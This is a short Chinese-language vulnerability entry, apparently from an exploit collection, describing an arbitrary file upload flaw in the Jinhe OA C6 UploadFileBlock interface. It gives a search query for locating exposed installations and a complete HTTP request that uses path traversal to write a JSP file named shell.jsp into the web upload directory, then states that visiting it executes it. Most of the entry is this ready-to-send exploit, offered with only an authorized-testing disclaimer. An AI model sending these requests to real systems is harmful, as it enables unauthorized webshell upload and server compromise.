---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA UploadFileBlock 任意文件上传漏洞

## 漏洞描述

金和OA C6 `/jc6/JHSoft.WCF/Attachment/UploadFileBlock` 接口存在任意文件上传漏洞。攻击者通过 multipart 请求上传 JSP 木马，文件被写入 `/jc6/upload/` 目录直接解析执行。

## 影响版本

```
金和OA C6
```

## 网络测绘

```
app="金和OA"
```

## 漏洞复现

```
POST /jc6/JHSoft.WCF/Attachment/UploadFileBlock HTTP/1.1
Content-Type: multipart/form-data; boundary=iid8vfr5ldmjijen8rel

--iid8vfr5ldmjijen8rel
Content-Disposition: form-data; name="filename"; filename="../../../../upload/shell.jsp"
Content-Type: application/octet-stream

<% out.println("test"); %>
--iid8vfr5ldmjijen8rel--
```

上传成功后访问 `/jc6/upload/shell.jsp` 即可执行。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
